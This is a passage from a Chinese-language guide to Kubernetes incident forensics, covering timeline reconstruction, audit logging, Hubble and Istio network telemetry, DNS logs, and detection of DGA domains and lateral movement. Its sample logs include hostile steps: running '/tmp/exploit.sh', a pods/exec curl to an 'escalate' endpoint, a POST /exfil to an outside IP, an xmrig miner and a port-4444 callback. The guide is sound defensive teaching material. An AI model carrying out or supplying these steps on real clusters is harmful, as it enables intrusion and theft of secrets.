在复杂的安全事件或故障调查中,**时间线重建 (Timeline Reconstruction)** 是理解"事件如何发生"的关键技术。它将分散在多个数据源中的事件按时间顺序排列,形成完整的因果叙事。

```
时间线重建的核心价值:

┌──────────────────────────────────────────────────────────────┐
│ 问题                    无时间线             有时间线         │
├──────────────────────────────────────────────────────────────┤
│ "攻击者何时获得初始   不确定               2026-02-25        │
│  访问权限?"                                 10:15:32 UTC     │
│                                                              │
│ "配置变更和故障的     时间顺序不清         变更 (10:28:15)  │
│  因果关系?"                                 → 故障 (10:28:45)│
│                                            相差 30 秒!       │
│                                                              │
│ "攻击者在系统中停留   无法确定停留时间     初始访问 (10:15) │
│  了多久?"                                   → 发现 (11:30)   │
│                                            停留时间: 75 分钟 │
│                                                              │
│ "哪些 Pod 受影响?"    难以关联             时间线显示 12 个  │
│                                            Pod 在攻击窗口内  │
│                                            有异常行为        │
└──────────────────────────────────────────────────────────────┘
```

### 2.5.2 多源数据关联方法论

Kubernetes 环境中的证据分散在多个异构数据源中,每个数据源有不同的时间戳格式、粒度和可靠性。时间线重建的核心挑战是**跨源关联**。

```
多源数据关联标识符体系:

┌─────────────────────────────────────────────────────────────┐
│ 关联标识符层级                                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Level 1: 强关联标识符 (唯一且稳定)                         │
│  ┌────────────────────────────────────────────────────────┐│
│  │ • Pod UID:                                            ││
│  │   示例: a1b2c3d4-e5f6-7890-abcd-ef1234567890          ││
│  │   出现位置: API Server 审计日志、kubelet 日志、       ││
│  │            cAdvisor 指标、Events、分布式追踪          ││
│  │                                                        ││
│  │ • Container ID (完整 64 字符):                         ││
│  │   示例: abc123def456...                               ││
│  │   出现位置: CRI 日志、eBPF 事件、cgroup 路径          ││
│  │                                                        ││
│  │ • Trace ID (分布式追踪):                              ││
│  │   示例: 4bf92f3577b34da6a3ce929d0e0e4736              ││
│  │   出现位置: 应用日志、Span 数据、API Gateway 日志     ││
│  │                                                        ││
│  │ • Audit ID (审计事件):                                ││
│  │   示例: f1e2d3c4-b5a6-9780-abcd-1234567890ab          ││
│  │   出现位置: API Server 审计日志                       ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  Level 2: 弱关联标识符 (可能重复或短暂)                     │
│  ┌────────────────────────────────────────────────────────┐│
│  │ • Pod Name:                                           ││
│  │   示例: nginx-deployment-7d9f8b-xyz                   ││
│  │   限制: ReplicaSet 管理的 Pod 名称会变化              ││
│  │                                                        ││
│  │ • Container Name:                                     ││
│  │   示例: nginx                                         ││
│  │   限制: 同一 Pod 中可能有同名容器                      ││
│  │                                                        ││
│  │ • IP 地址:                                            ││
│  │   示例: 10.244.1.10                                   ││
│  │   限制: Pod 重启后 IP 可能变化                         ││
│  │                                                        ││
│  │ • Node Name:                                          ││
│  │   示例: node-03                                       ││
│  │   限制: 多个 Pod 在同一节点                            ││
│  └────────────────────────────────────────────────────────┘│
│                                                             │
│  Level 3: 时间窗口关联 (无直接标识符)                       │
│  ┌────────────────────────────────────────────────────────┐│
│  │ 当无法通过标识符直接关联时,使用时间窗口匹配:           ││
│  │                                                        ││
│  │ • 基于事件时间戳的邻近性                               ││
│  │ • 基于模式相似性 (如 CPU 峰值和错误日志同时出现)       ││
│  │ • 基于因果推理 (A 事件类型通常在 B 事件后 5 秒发生)    ││
│  └────────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────────┘
```

**关联示例: Pod UID 跨源追踪**

```
场景: 追踪 Pod "web-app-7d9f8b-xyz" 的完整生命周期

Pod UID: a1b2c3d4-e5f6-7890-abcd-ef1234567890

数据源 1: API Server 审计日志
─────────────────────────────────────────────────────────────
{
  "timestamp": "2026-02-25T10:15:30.123456Z",
  "verb": "create",
  "objectRef": {
    "resource": "pods",
    "name": "web-app-7d9f8b-xyz",
    "namespace": "production",
    "uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"  ← Pod UID
  },
  "user": {
    "username": "system:serviceaccount:production:deployment-controller"
  }
}

数据源 2: kubelet 日志 (节点 node-03)
─────────────────────────────────────────────────────────────
2026-02-25T10:15:32 node-03 kubelet[1234]: I0225 10:15:32.456 
  SyncPod pod=a1b2c3d4-e5f6-7890-abcd-ef1234567890 
  status=ContainerCreating

数据源 3: cAdvisor 指标 (Prometheus)
─────────────────────────────────────────────────────────────
container_memory_usage_bytes{
  pod="web-app-7d9f8b-xyz",
  namespace="production",
  container="nginx",
  pod_uid="a1b2c3d4-e5f6-7890-abcd-ef1234567890"  ← Pod UID
} 1.2e+08 @1708860933

数据源 4: Falco eBPF 事件
─────────────────────────────────────────────────────────────
{
  "time": "2026-02-25T10:28:45.789Z",
  "output": "Suspicious process spawned",
  "output_fields": {
    "k8s.pod.uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",  ← Pod UID
    "k8s.pod.name": "web-app-7d9f8b-xyz",
    "proc.name": "xmrig"
  }
}

数据源 5: 应用日志 (Loki)
─────────────────────────────────────────────────────────────
{
  "timestamp": "2026-02-25T10:28:45.800",
  "level": "ERROR",
  "message": "Unexpected process detected",
  "labels": {
    "pod_uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"  ← Pod UID
  }
}

关联结果: 通过 Pod UID,我们可以将这 5 个数据源中的事件关联起来
```

### 2.5.3 Kubernetes 审计日志:黄金数据源

Kubernetes API Server 审计日志是时间线重建的**黄金数据源 (Golden Source)**,因为:

```
审计日志的独特价值:

✓ 完整性: 记录所有 API 操作 (kubectl, controller, webhook)
✓ 权威性: 来自 API Server,无法被容器内进程篡改
✓ 结构化: JSON 格式,易于解析和查询
✓ 详细性: 包含 who/what/when/where/result 完整上下文
✓ 不可抵赖性: 包含用户身份验证信息
```

**审计日志四个级别**:

| Level | 记录内容 | 数据量 | 适用场景 |
|-------|---------|-------|----------|
| **None** | 不记录 | 0 | 忽略噪音事件 (如 healthcheck) |
| **Metadata** | 请求元数据 (时间/用户/资源/动作) | 小 | 标准生产环境 |
| **Request** | Metadata + 请求体 | 中 | 需要审查配置变更 |
| **RequestResponse** | Metadata + 请求体 + 响应体 | 大 | 安全审计/合规要求 |

**审计策略配置示例**:

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Level 1: 安全敏感操作 - 完整记录
  - level: RequestResponse
    verbs: ["create", "update", "patch", "delete"]
    resources:
      - group: ""
        resources: ["secrets", "serviceaccounts"]
      - group: "rbac.authorization.k8s.io"
        resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
      - group: "policy"
        resources: ["podsecuritypolicies"]
    omitStages:
      - "RequestReceived"
  
  # Level 2: Pod 生命周期 - 记录元数据和请求
  - level: Request
    verbs: ["create", "delete"]
    resources:
      - group: ""
        resources: ["pods", "pods/exec", "pods/portforward", "pods/attach"]
  
  # Level 3: 读操作 - 仅元数据
  - level: Metadata
    verbs: ["get", "list", "watch"]
  
  # Level 4: 健康检查 - 不记录
  - level: None
    users: ["system:kube-proxy"]
    verbs: ["watch"]
    resources:
      - group: ""
        resources: ["endpoints", "services"]
  
  # Level 5: 高频低价值事件 - 不记录
  - level: None
    users: ["kubelet"]
    verbs: ["get"]
    resources:
      - group: ""
        resources: ["nodes", "nodes/status"]
  
  # 默认: 所有其他请求记录元数据
  - level: Metadata
    omitStages:
      - "RequestReceived"
```

**关键审计事件识别**:

```
安全取证中的关键审计事件:

┌───────────────────────────────────────────────────────────┐
│ 事件类型              Verb        Resource              │
├───────────────────────────────────────────────────────────┤
│ 特权 Pod 创建         create      pods                  │
│   (hostNetwork/hostPID/privileged=true)                 │
│                                                         │
│ Secret 访问           get/list    secrets               │
│                                                         │
│ RBAC 变更             create/     roles/rolebindings   │
│                       update/                           │
│                       delete                            │
│                                                         │
│ Pod 命令执行          create      pods/exec             │
│   (kubectl exec)                                        │
│                                                         │
│ ServiceAccount        create/     serviceaccounts/     │
│ Token 创建            create      token                 │
│                                                         │
│ 节点操作              update      nodes/status          │
│   (节点驱逐/污点)                                        │
│                                                         │
│ 审计策略修改          update      auditconfigurations   │
│   (攻击者可能尝试                                        │
│    禁用审计)                                            │
└───────────────────────────────────────────────────────────┘
```

### 2.5.4 时间线重建工具: Timesketch + Plaso

**Plaso (log2timeline)** 是开源的超级时间线生成工具,**Timesketch** 是配套的可视化分析平台。

```
Timesketch 工作流:

Step 1: 证据采集
┌───────────────────────────────────────────────────────────┐
│ • Kubernetes 审计日志 (JSON)                              │
│ • 应用日志 (JSON/Plain Text)                              │
│ • eBPF 事件 (Falco JSON)                                  │
│ • 指标时序数据 (Prometheus export)                        │
│ • 分布式追踪 (Jaeger JSON export)                         │
│ • 节点系统日志 (journalctl export)                        │
└───────────────────────────────────────────────────────────┘
        │
        ▼
Step 2: Plaso 解析和归一化
$ log2timeline.py --storage-file timeline.plaso \
    audit.log \
    app.log \
    falco-events.json \
    ...

Plaso 功能:
  • 识别 80+ 种日志格式
  • 提取时间戳 (支持多种格式)
  • 归一化字段名称
  • 生成超级时间线
        │
        ▼
Step 3: 导入 Timesketch
$ timesketch_importer.py --timeline_name "INC-20260225-001" \
    timeline.plaso

Timesketch 功能:
  • 交互式时间线浏览
  • 基于 OpenSearch 的全文搜索
  • 标记和注释事件
  • 创建事件故事 (Story)
  • 协作调查
        │
        ▼
Step 4: 分析和可视化
┌───────────────────────────────────────────────────────────┐
│ Timesketch UI:                                            │
│                                                           │
│ ┌─────────────────────────────────────────────────────┐ │
│ │ Timeline View                                       │ │
│ │ ─────────────────────────────────────────────────── │ │
│ │ [10:15:30] API Server: Pod Created                 │ │
│ │ [10:15:32] kubelet: Container Starting             │ │
│ │ [10:15:35] App Log: Application Started            │ │
│ │ ...                                                 │ │
│ │ [10:28:45] Falco: Suspicious Process (xmrig) 🔴    │ │
│ │ [10:28:46] App Log: ERROR unexpected process       │ │
│ │ [10:28:50] API Server: Secret accessed by Pod 🔴   │ │
│ │ [10:29:00] Network: Outbound connection to         │ │
│ │            185.71.67.84:4444 🔴                     │ │
│ └─────────────────────────────────────────────────────┘ │
│                                                           │
│ ┌─────────────────────────────────────────────────────┐ │
│ │ Graph View (事件关系图)                             │ │
│ │                                                     │ │
│ │   Pod Created → Container Start → App Start        │ │
│ │                       │                             │ │
│ │                       ├──→ Suspicious Process       │ │
│ │                       │         │                   │ │
│ │                       │         └──→ Secret Access  │ │
│ │                       │              │              │ │
│ │                       │              └──→ Data Exfil│ │
│ └─────────────────────────────────────────────────────┘ │
└───────────────────────────────────────────────────────────┘
```

### 2.5.5 超级时间线概念

**Super Timeline (超级时间线)** 是指将系统中所有可能包含时间戳的数据源整合到单一时间线中:

```
超级时间线的数据源 (Kubernetes 环境):

文件系统层:
  • 文件 MACB 时间 (Modified/Accessed/Changed/Born)
  • 容器层文件系统的创建/修改时间
  • /var/log/* 日志文件的时间戳

应用层:
  • 应用日志中的时间戳
  • 数据库事务时间
  • HTTP 访问日志

系统层:
  • 系统日志 (journald/syslog)
  • 审计日志 (auditd)
  • cron 任务执行记录
  • 用户登录记录 (wtmp/lastlog)

Kubernetes 层:
  • API Server 审计日志
  • kubelet/kube-proxy 日志
  • Events (虽然 TTL 短,但可从 etcd 快照恢复)
  • Controller 日志

网络层:
  • NetFlow/sFlow 记录
  • DNS 查询日志
  • 防火墙日志
  • Service Mesh 遥测

可观测性层:
  • Prometheus 指标 (每个数据点都是时间戳事件)
  • 分布式追踪 Spans
  • eBPF 事件流

结果: 数百万个时间戳事件,形成系统状态的"完整历史"
```

### 2.5.6 跨层事件关联技术

```
实战案例: 重建权限提升攻击的完整时间线

初始观察:
  告警: "Unauthorized Secret access at 10:28:50"

调查问题:
  • 谁访问了 Secret?
  • 他们如何获得权限?
  • 初始入口点在哪里?

时间线重建步骤:
─────────────────────────────────────────────────────────────
T-15min  [10:13:45] 应用层
         HTTP 请求: POST /api/upload (恶意文件上传)
         来源 IP: 203.0.113.42
         User-Agent: Mozilla/5.0 (攻击者伪装)
         
         关联: 分布式追踪 Trace ID: 4bf92f3577b34da6

T-10min  [10:18:30] 文件系统层
         新文件创建: /tmp/exploit.sh
         MACB: M=10:18:30, A=10:18:30, C=10:18:30, B=10:18:30
         SHA256: e3b0c44298fc1c149afbf4c8996fb924...
         
         关联: 从审计日志找到创建该文件的 Pod UID

T-5min   [10:23:15] eBPF 层 (Falco)
         事件: Shell spawned in container
         Process: /bin/bash -c "/tmp/exploit.sh"
         Container ID: abc123def456
         Pod UID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
         
         关联: Pod UID 连接到后续事件

T-2min   [10:26:40] API Server 审计日志
         Verb: create
         Resource: pods/exec
         User: system:serviceaccount:default:web-app-sa
         Target Pod: web-app-7d9f8b-xyz (UID: a1b2c3d4...)
         Command: ["/bin/bash", "-c", "curl http://internal-admin-api/escalate"]
         
         关联: ServiceAccount 权限检查

T-1min   [10:27:30] RBAC 审计日志
         Verb: update
         Resource: rolebindings
         User: web-app-sa (已被攻击者控制)
         Changes: 添加 "secrets-reader" 权限到 web-app-sa
         
         ⚠️ 关键发现: 攻击者利用 web-app-sa 的过宽权限
                     (误配置: 允许修改 RoleBinding)

T+0      [10:28:50] API Server 审计日志
         Verb: get
         Resource: secrets
         Name: database-credentials
         User: system:serviceaccount:default:web-app-sa
         Response: 200 OK (Secret 内容已泄露)
         
         🔴 告警触发点

T+2min   [10:30:15] 网络层 (Cilium Hubble)
         Flow: 10.244.1.10:45678 → 203.0.113.42:443
         Protocol: HTTPS
         Bytes Out: 2048 (疑似泄露的 Secret)
         L7 Protocol: HTTP POST /exfil
         
         🔴 数据泄露确认

完整攻击链:
─────────────────────────────────────────────────────────────
① 文件上传漏洞 (10:13:45)
     ↓
② 恶意脚本落盘 (10:18:30)
     ↓
③ Shell 执行 (10:23:15)
     ↓
④ kubectl exec 提权尝试 (10:26:40)
     ↓
⑤ RBAC 权限篡改 (10:27:30) ← 关键漏洞点
     ↓
⑥ Secret 访问 (10:28:50)
     ↓
⑦ 数据泄露 (10:30:15)

根本原因:
  • 应用存在文件上传 RCE 漏洞
  • ServiceAccount 权限过宽 (可修改 RoleBinding)
  • 缺少 NetworkPolicy (允许任意外连)

修复措施:
  1. 修复文件上传漏洞
  2. 应用最小权限原则 (ServiceAccount 仅 get pods)
  3. 实施 NetworkPolicy (拒绝非必要外连)
  4. 启用 Pod Security Standards (restricted)
```

### 2.5.7 时间同步挑战

```
Kubernetes 分布式环境中的时间同步问题:

挑战:
┌──────────────────────────────────────────────────────────────┐
│ • 多节点时钟漂移: 不同节点的系统时间可能不同步              │
│ • 时区差异: 日志可能使用不同时区 (UTC vs Local)             │
│ • 时间戳精度差异: 毫秒 vs 微秒 vs 纳秒                       │
│ • 日志缓冲延迟: 日志写入时间 ≠ 事件发生时间                  │
│ • 跨时区服务: 全球分布式集群                                 │
└──────────────────────────────────────────────────────────────┘

解决方案:
┌──────────────────────────────────────────────────────────────┐
│ 1. NTP/Chrony 时间同步                                        │
│    • 所有节点同步到权威时间源                                 │
│    • 监控时钟偏移 (node_timex_offset_seconds)                │
│    • 告警阈值: > 100ms                                        │
│                                                              │
│ 2. 统一时区 (UTC)                                             │
│    • 所有日志强制使用 UTC                                     │
│    • Kubernetes 原生使用 RFC3339 格式 (含时区)                │
│    • 示例: 2026-02-25T10:28:50.123456Z                       │
│                                                              │
│ 3. 高精度时间戳                                               │
│    • eBPF: bpf_ktime_get_ns() 提供纳秒精度                   │
│    • 审计日志: 微秒精度时间戳                                 │
│    • 分布式追踪: 纳秒精度 Span 时间                           │
│                                                              │
│ 4. 向量时钟 (Vector Clocks)                                  │
│    • 在因果关系不确定时使用向量时钟                           │
│    • 分布式追踪天然支持 (Span 关系图)                         │
└──────────────────────────────────────────────────────────────┘

时钟漂移检测与补偿:
$ promql 'abs(node_time_seconds - time()) > 1'
  node-05: 2.3s drift (需要 NTP 修复)

时间线重建中的补偿:
  • 如果检测到时钟漂移,在时间线中添加标注
  • 使用因果关系而非绝对时间排序 (当漂移严重时)
  • 在报告中明确说明时间不确定性
```

---

## 2.6 网络取证技术

### 2.6.1 Kubernetes 网络模型

```
Kubernetes 网络层级模型:

┌─────────────────────────────────────────────────────────────┐
│ Layer 7: Service Mesh (Istio/Linkerd)                       │
│ ─────────────────────────────────────────────────────────── │
│ • Sidecar Proxy (Envoy/Linkerd-proxy)                      │
│ • mTLS 加密通信                                              │
│ • L7 流量遥测 (HTTP method, path, headers, status)          │
│ • 访问控制 (AuthorizationPolicy)                            │
│ • 取证价值: 完整的 L7 请求/响应元数据                        │
├─────────────────────────────────────────────────────────────┤
│ Layer 4-6: Service Abstraction                              │
│ ─────────────────────────────────────────────────────────── │
│ • Kubernetes Service (ClusterIP/NodePort/LoadBalancer)      │
│ • kube-proxy iptables/IPVS 规则                             │
│ • Ingress Controller (Nginx/Traefik/HAProxy)               │
│ • 取证价值: 服务发现路径、负载均衡日志                       │
├─────────────────────────────────────────────────────────────┤
│ Layer 3: Pod Networking (CNI)                               │
│ ─────────────────────────────────────────────────────────── │
│ • CNI 插件 (Calico/Cilium/Flannel/Weave)                   │
│ • NetworkPolicy 执行                                        │
│ • VXLAN/BGP overlay 网络                                    │
│ • 取证价值: 网络策略日志、流量统计                           │
├─────────────────────────────────────────────────────────────┤
│ Layer 2: Node Networking                                    │
│ ─────────────────────────────────────────────────────────── │
│ • Linux Bridge/veth pairs                                   │
│ • OVS (Open vSwitch)                                        │
│ • 取证价值: 接口统计、ARP 表                                 │
├─────────────────────────────────────────────────────────────┤
│ Layer 1: Physical/VM Networking                             │
│ ─────────────────────────────────────────────────────────── │
│ • 物理网卡/虚拟网卡                                          │
│ • 云服务商网络 (AWS VPC/Azure VNet)                          │
│ • 取证价值: NetFlow/VPC Flow Logs                            │
└─────────────────────────────────────────────────────────────┘
```

### 2.6.2 CNI 插件日志与流量数据

**Cilium + Hubble: 网络可观测性的黄金组合**

```
Cilium Hubble 架构:

┌──────────────────────────────────────────────────────────────┐
│ Pod A                              Pod B                      │
│ ┌────────────┐                    ┌────────────┐            │
│ │ 应用容器   │                    │ 应用容器   │            │
│ └─────┬──────┘                    └─────┬──────┘            │
│       │ Packet                          │                    │
│       ▼                                 ▼                    │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ Kernel (eBPF Programs)                                 │  │
│ │ ┌──────────────┐        ┌──────────────┐              │  │
│ │ │ Cilium Agent │        │ Hubble       │              │  │
│ │ │ (NetworkPolicy│◄──────►│ (Observabili-│              │  │
│ │ │  Enforcement) │        │  ty Layer)   │              │  │
│ │ └──────────────┘        └──────┬───────┘              │  │
│ └────────────────────────────────┼──────────────────────┘  │
└──────────────────────────────────┼─────────────────────────┘
                                    │ gRPC Stream
                                    ▼
┌──────────────────────────────────────────────────────────────┐
│ Hubble Relay (集群级聚合)                                     │
│ • 汇总所有节点的 Hubble 数据                                  │
│ • 提供统一的查询接口                                          │
└────────────────┬─────────────────────────────────────────────┘
                 │
        ┌────────┼────────┐
        ▼        ▼        ▼
   Hubble UI  Hubble CLI  取证工具

Hubble Flow 数据示例:
{
  "time": "2026-02-25T10:28:50.123456Z",
  "verdict": "FORWARDED",  // or "DROPPED"
  "ethernet": {
    "source": "aa:bb:cc:dd:ee:ff",
    "destination": "11:22:33:44:55:66"
  },
  "IP": {
    "source": "10.244.1.10",
    "destination": "185.71.67.84",
    "ipVersion": "IPv4"
  },
  "l4": {
    "TCP": {
      "source_port": 42358,
      "destination_port": 4444,
      "flags": {
        "SYN": false,
        "ACK": true,
        "PSH": true
      }
    }
  },
  "source": {
    "namespace": "production",
    "pod_name": "web-app-7d9f8b-xyz",
    "labels": {
      "app": "web-app",
      "version": "v1.2.3"
    }
  },
  "destination": {
    "identity": 2,  // "world" (cluster external)
    "labels": ["reserved:world"]
  },
  "Type": "L3_L4",
  "event_type": {
    "type": 4,
    "sub_type": 0
  },
  "Summary": "TCP Flags: ACK, PSH"
}

取证查询示例:
# 查询特定 Pod 的所有外部连接
$ hubble observe --pod production/web-app-7d9f8b-xyz \
    --to-identity reserved:world \
    --since 2026-02-25T10:00:00Z

# 查询被 NetworkPolicy 阻断的流量
$ hubble observe --verdict DROPPED \
    --from-pod production/web-app-7d9f8b-xyz

# 查询到特定 IP 的连接
$ hubble observe --to-ip 185.71.67.84
```

### 2.6.3 Service Mesh 遥测作为证据

**Istio 遥测数据的取证价值**

```
Istio Envoy Access Log 示例:

[2026-02-25T10:28:50.789Z] "POST /api/secrets HTTP/1.1" 200 - 
  via_upstream - "-" 0 1234 15 14 "10.244.1.10" 
  "curl/7.68.0" "4bf92f35-77b3-4da6-a3ce-929d0e0e4736" 
  "internal-api.production.svc.cluster.local:8080" 
  "10.244.2.20:8080" 
  outbound|8080||internal-api.production.svc.cluster.local 
  10.244.1.10:45678 10.96.0.50:8080 
  10.244.1.10:35792 - default

解析:
  • Timestamp: 2026-02-25T10:28:50.789Z
  • Method: POST
  • Path: /api/secrets  ← 敏感 API 访问!
  • Response Code: 200  ← 成功访问
  • Source IP: 10.244.1.10 (web-app Pod)
  • Destination: internal-api.production.svc.cluster.local
  • User-Agent: curl/7.68.0  ← 异常!应该是应用代码,而非 curl
  • Trace ID: 4bf92f35-77b3-4da6-a3ce-929d0e0e4736
  • Response Size: 1234 bytes  ← 可能是泄露的 Secret

取证分析:
  1. 关联 Trace ID 到分布式追踪系统
  2. 查找同一时间窗口的异常进程 (通过 eBPF)
  3. 确认 curl 进程的父进程和命令行参数
  4. 验证该 Pod 的 ServiceAccount 权限
```

**Istio AuthorizationPolicy 日志**

```yaml
# Istio AuthorizationPolicy 拒绝日志
{
  "timestamp": "2026-02-25T10:35:00.000Z",
  "severity": "WARNING",
  "message": "RBAC: access denied",
  "attributes": {
    "source.principal": "cluster.local/ns/production/sa/web-app-sa",
    "destination.service": "database.production.svc.cluster.local",
    "request.method": "GET",
    "request.path": "/admin/users",
    "authorization.decision": "DENY",
    "authorization.policy": "database-access-policy"
  }
}

取证价值:
  ✓ 记录了被拒绝的访问尝试 (可能是攻击探测)
  ✓ 包含完整的身份信息和请求详情
  ✓ 可用于检测横向移动尝试
```

### 2.6.4 DNS 查询日志分析

```
CoreDNS 日志插件配置:

Corefile:
.:53 {
    errors
    health {
       lameduck 5s
    }
    ready
    kubernetes cluster.local in-addr.arpa ip6.arpa {
       pods insecure
       fallthrough in-addr.arpa ip6.arpa
       ttl 30
    }
    prometheus :9153
    forward . /etc/resolv.conf {
       max_concurrent 1000
    }
    cache 30
    loop
    reload
    loadbalance
    
    # 启用日志记录
    log {
        class error denial  # 仅记录错误和拒绝
    }
    # 或全量日志:
    # log
}

DNS 查询日志示例:
[INFO] 10.244.1.10:53241 - 12345 "A IN pool.minexmr.com. udp 41 false 512" NOERROR qr,rd,ra 97 0.002s

解析:
  • 查询者: 10.244.1.10 (suspicious Pod)
  • 查询类型: A 记录
  • 域名: pool.minexmr.com  ← 已知的加密货币矿池域名!
  • 响应: NOERROR (成功解析)
  • 响应时间: 0.002s

取证分析:
  1. 提取所有该 Pod 的 DNS 查询
  2. 与威胁情报库匹配域名 (IoC)
  3. 检测 DGA (Domain Generation Algorithm) 模式
  4. 分析查询频率和时间模式
```

**DGA 域名检测算法**

```python
# 基于统计特征的 DGA 检测
def detect_dga(domain):
    features = {
        'length': len(domain),
        'entropy': calculate_shannon_entropy(domain),
        'consonant_ratio': count_consonants(domain) / len(domain),
        'digit_ratio': count_digits(domain) / len(domain),
        'tld': extract_tld(domain)
    }
    
    # DGA 域名的典型特征:
    # • 高熵值 (随机字符组合)
    # • 高辅音比例
    # • 长度异常 (通常 > 15)
    # • 罕见 TLD
    
    if (features['entropy'] > 4.5 and 
        features['consonant_ratio'] > 0.7 and
        features['length'] > 15):
        return True, "High probability DGA domain"
    
    return False, "Normal domain"

# 示例:
detect_dga("adfkljweoirjlskdjflksjdf.com")  
# → True, DGA detected

detect_dga("www.google.com")  
# → False, Normal domain
```

### 2.6.5 横向移动检测

```
横向移动的网络证据模式:

正常流量模式:
  前端 Pod → 后端 API Pod → 数据库 Pod
  (明确的服务依赖关系,可预测的通信模式)

横向移动模式:
  被攻陷 Pod → 其他 Pod (同 Namespace)
  被攻陷 Pod → Kubernetes API Server (信息收集)
  被攻陷 Pod → 其他 Namespace 的 Pod (跨 Namespace 探测)

检测规则:
┌──────────────────────────────────────────────────────────────┐
│ 异常 1: Pod 间直接通信 (绕过 Service)                        │
│ ─────────────────────────────────────────────────────────── │
│ 正常: Pod A → Service B → Pod B                             │
│ 异常: Pod A → Pod B (直接 IP)                                │
│                                                              │
│ 检测: Hubble 查询目标为 Pod IP 而非 Service IP 的流量        │
├──────────────────────────────────────────────────────────────┤
│ 异常 2: 端口扫描                                              │
│ ─────────────────────────────────────────────────────────── │
│ 特征: 短时间内向多个 IP:Port 发起连接                         │
│       大量 SYN 包,无后续 ACK (连接失败)                       │
│                                                              │
│ 检测: 统计每个 Pod 的目标 IP:Port 数量                        │
│       阈值: 1分钟内 > 20 个不同目标 → 告警                    │
├──────────────────────────────────────────────────────────────┤
│ 异常 3: 访问 Kubernetes API Server (未授权)                  │
│ ─────────────────────────────────────────────────────────── │
│ 正常: 仅授权的 Pod 访问 API Server (通过 ServiceAccount)     │
│ 异常: 非预期 Pod 向 kubernetes.default.svc:443 发起请求      │
│                                                              │
│ 检测: 关联 Hubble 流量和 API Server 审计日志                 │
│       审计日志中出现 403 Forbidden → 网络日志中找到来源       │
├──────────────────────────────────────────────────────────────┤
│ 异常 4: 跨 Namespace 访问 (违反 NetworkPolicy)                │
│ ─────────────────────────────────────────────────────────── │
│ 特征: Namespace A 的 Pod 尝试访问 Namespace B                │
│                                                              │
│ 检测: Cilium NetworkPolicy 拒绝日志                          │
│       verdict: DROPPED, reason: "Policy denied"              │
└──────────────────────────────────────────────────────────────┘

PromQL 查询示例:
# 检测端口扫描
sum by (source_pod) (
  rate(cilium_drop_count_total{reason="Policy denied"}[1m])
) > 10

# 检测未授权 API 访问
sum by (source_namespace, source_pod) (
  rate(cilium_forward_count_total{
    destination_service="kubernetes.default.svc.cluster.local:443"
  }[5m])
)
```

### 2.6.6 多租户环境网络隔离

```
多租户网络取证挑战:

挑战:
┌──────────────────────────────────────────────────────────────┐
│ • 租户间流量隔离验证: 如何证明租户 A 无法访问租户 B?         │
│ • 共享基础设施: 相同物理节点上的不同租户 Pod                  │
│ • IP 地址重叠: 不同租户可能使用相同的 Pod IP 段               │
│ • 侧信道攻击: 通过共享资源 (CPU cache) 的信息泄露             │
└──────────────────────────────────────────────────────────────┘

解决方案:
┌──────────────────────────────────────────────────────────────┐
│ 1. 严格的 NetworkPolicy                                       │
│    • Default Deny All                                        │
│    • 明确白名单允许的流量                                     │
│    • 定期审计 NetworkPolicy 配置                             │
│                                                              │
│ 2. 租户标签和选择器                                           │
│    • 所有资源打标签: tenant=acme-corp                         │
│    • NetworkPolicy 基于标签选择                              │
│    • 防止跨租户标签冲突                                       │
│                                                              │
│ 3. 网络流量审计                                               │
│    • Hubble 记录所有跨 Namespace 流量                        │
│    • 自动检测违反租户边界的流量                               │
│    • 告警 + 自动阻断                                          │
│                                                              │
│ 4. 物理隔离 (高安全要求)                                      │
│    • 不同租户使用不同节点 (Node Affinity)                     │
│    • 不同的网络平面 (Multiple CNI)                            │
│    • 硬件级隔离 (SR-IOV)                                      │
└──────────────────────────────────────────────────────────────┘
```

---

## 2.7 Kubernetes 审计日志深度解析

### 2.7.1 审计日志结构与字段

```json
// Kubernetes 审计事件完整结构
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "RequestResponse",
  
  // 1. 事件元数据
  "auditID": "f1e2d3c4-b5a6-9780-abcd-1234567890ab",
  "stage": "ResponseComplete",  // RequestReceived/ResponseStarted/ResponseComplete/Panic
  "requestURI": "/api/v1/namespaces/production/secrets/db-credentials",
  "verb": "get",
  "user": {
    "username": "system:serviceaccount:production:web-app-sa",
    "uid": "12345678-1234-1234-1234-123456789012",
    "groups": [
      "system:serviceaccounts",
      "system:serviceaccounts:production",
      "system:authenticated"
    ],
    "extra": {
      "authentication.kubernetes.io/pod-name": ["web-app-7d9f8b-xyz"],
      "authentication.kubernetes.io/pod-uid": ["a1b2c3d4-e5f6-7890-abcd-ef1234567890"]
    }
  },
  
  // 2. 源信息
  "sourceIPs": ["10.244.1.10"],
  "userAgent": "kubectl/v1.28.0 (linux/amd64) kubernetes/abc1234",
  
  // 3. 目标对象
  "objectRef": {
    "resource": "secrets",
    "namespace": "production",
    "name": "db-credentials",
    "uid": "87654321-4321-4321-4321-210987654321",
    "apiGroup": "",
    "apiVersion": "v1",
    "resourceVersion": "123456"
  },
  
  // 4. 时间信息
  "requestReceivedTimestamp": "2026-02-25T10:28:50.123456Z",
  "stageTimestamp": "2026-02-25T10:28:50.145678Z",
  
  // 5. 请求体 (Level: Request/RequestResponse)
  "requestObject": {
    // 原始请求的 JSON 内容
  },
  
  // 6. 响应体 (Level: RequestResponse)
  "responseObject": {
    "kind": "Secret",
    "apiVersion": "v1",
    "metadata": {
      "name": "db-credentials",
      "namespace": "production"
    },
    "data": {
      "username": "YWRtaW4=",  // base64: admin
      "password": "cGFzc3dvcmQxMjM="  // base64: password123
    },
    "type": "Opaque"
  },
  
  // 7. 响应状态
  "responseStatus": {
    "metadata": {},
    "code": 200
  },
  
  // 8. 注解 (Admission Webhook 可添加)
  "annotations": {
    "authorization.k8s.io/decision": "allow",
    "authorization.k8s.io/reason": "RBAC: allowed by RoleBinding"
  }
}
```

### 2.7.2 关键审计事件模式

```
安全取证中的关键审计模式:

┌──────────────────────────────────────────────────────────────┐
│ 模式 1: 未授权访问尝试                                        │
│ ─────────────────────────────────────────────────────────── │
│ 特征:                                                        │
│   verb: get/list/watch/create/update/delete                 │
